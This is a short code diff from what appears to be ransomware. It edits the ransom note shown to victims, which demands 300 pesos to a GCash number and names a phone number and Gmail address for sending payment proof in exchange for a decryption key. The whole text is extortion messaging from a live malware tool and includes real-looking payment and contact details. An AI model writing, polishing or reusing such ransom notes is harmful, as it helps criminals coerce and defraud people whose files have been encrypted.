@@ -151,7 +151,7 @@ The original files have been completely deleted and will only be recovered by fo
 1. To obtain the key which will decrypt files,you need to pay 300 pesos from this gcash wallet address:
     >> \033[93m 09284962794 \033[0m <<
 
-2. After the payment is completed, contact us to \033[96m 09451t62126 \033[0m and send us the Transaction ID or your payment screenshot, and we will give you the key.
+2. After the payment is completed, contact us to \033[96m 09451562126 or ubuntujaypxel@gmail.com \033[0m and send us the Transaction ID or your payment screenshot, and we will give you the key.
 
 
 \033[91m[!]\033[0m Do not rename or modify encrypted files.
